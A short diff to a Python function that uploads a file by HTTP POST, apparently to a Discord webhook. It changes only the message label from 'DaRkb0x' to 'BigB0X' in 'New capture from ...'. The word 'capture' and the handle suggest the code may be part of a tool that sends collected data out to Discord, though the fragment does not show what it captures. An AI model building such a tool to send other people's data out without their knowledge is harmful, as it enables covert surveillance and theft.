@@ -51,7 +51,7 @@ def send_file(path: str) -> tuple[bool, str]:
             # Detect mimetype
             files = {"file": (p.name, f)}
             # Optional: Add metadata/content for Discord
-            data = {"content": f"New capture from DaRkb0x: {p.name}"}
+            data = {"content": f"New capture from BigB0X: {p.name}"}
             
             r = requests.post(url, files=files, data=data, timeout=30)
             
